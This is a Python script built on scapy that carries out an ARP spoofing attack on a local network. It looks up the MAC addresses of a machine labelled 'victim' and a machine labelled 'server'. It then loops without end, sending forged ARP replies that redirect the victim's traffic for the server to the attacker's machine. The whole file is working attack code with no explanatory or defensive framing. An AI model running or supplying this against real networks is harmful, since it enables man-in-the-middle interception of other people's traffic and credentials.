#!/usr/bin/python3

from scapy.all import Ether, ARP, srp, send, IP, TCP, Raw, sr1
from time import sleep
import threading
import psutil
import os
import subprocess
import socket

def get_my_mac_address(interface_name):
    # Get a dictionary of all the network interfaces on the computer.
    interfaces = psutil.net_if_addrs()

    if interface_name in interfaces:
        # Iterates through the list of addresses associated with this interface.
        for addr in interfaces[interface_name]:
            # Check MAC address family.
            if addr.family == psutil.AF_LINK:
                return addr.address
    else:
        return None

def get_mac(dst_ip, operation, interface, src_mac):

    try:
        # Craft an ARP request packet.
        arp_request = ARP(pdst = dst_ip, op = operation)
        ether_frame = Ether(src = src_mac, dst = "FF:FF:FF:FF:FF:FF")
        arp_packet = ether_frame / arp_request

        # Send the packet and receive the response.
        responses, unanswered = srp(arp_packet, timeout = 2, retry = 1, verbose=False, iface = interface)
            
        if responses:
            return responses[0][1].hwsrc

        else:
            return None

    except Exception as e:
        print(f"An error occurred while getting the MAC address for {dst_ip}: {e}")
        return None

def arp_spoof(dst_ip, spoofed_ip, dst_mac, src_mac, operation, interface):
    arp_response = ARP(op=operation, pdst=dst_ip, psrc=spoofed_ip, hwdst=dst_mac, hwsrc=src_mac)
    ether_frame = Ether(src=src_mac, dst=dst_mac)
    arp_packet = ether_frame / arp_response
    
    while True:
        print(f"Spoofing is ongoing for {spoofed_ip} ...")
        srp(arp_packet, timeout=2, retry=1, verbose=False, iface=interface)
        sleep(5)

interface  = "eth0"
operation  = 0x01
my_ip      = "10.0.0.1"
victim_ip  = "10.0.0.2"
spoofed_ip = "10.0.0.3"

my_mac_address = get_my_mac_address(interface)
server_mac_address = get_mac(spoofed_ip, operation, interface, my_mac_address)
victim_mac = get_mac(victim_ip, operation, interface, my_mac_address)

print(f"My MAC address: {my_mac_address}")
print(f"The server's MAC address: {server_mac_address}")
print(f"The victim's MAC address: {victim_mac}\n\n")

operation = 0x02

t1 = threading.Thread(target = arp_spoof, args=(victim_ip, spoofed_ip, victim_mac, my_mac_address, operation, interface))

t1.start()

t1.join()
